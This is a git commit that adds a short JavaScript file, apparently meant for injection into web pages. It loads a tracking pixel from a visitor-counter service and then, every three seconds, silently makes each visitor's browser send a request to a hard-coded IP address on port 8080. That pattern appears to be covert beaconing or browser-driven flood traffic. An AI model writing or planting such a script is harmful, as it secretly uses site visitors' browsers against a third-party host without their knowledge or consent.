a0e23a35b4c7dc2935ade43131d60836744cee59
webr00t <40573532+webr00t@users.noreply.github.com>
2020-09-25 07:49:38 -0700

    Create we.js

---
+++ we.js
@@ -0,0 +1,4 @@
+if (!document.getElementById("amung")) { new Image().src='http://whos.amung.us/swidget/denemedirl.pnh'; }
+setTimeout(function(){
+window.setInterval(function(){var teya=new Image().src='http://93.158.237.11:8080/api.php'}, 3000);
+}, 3000);
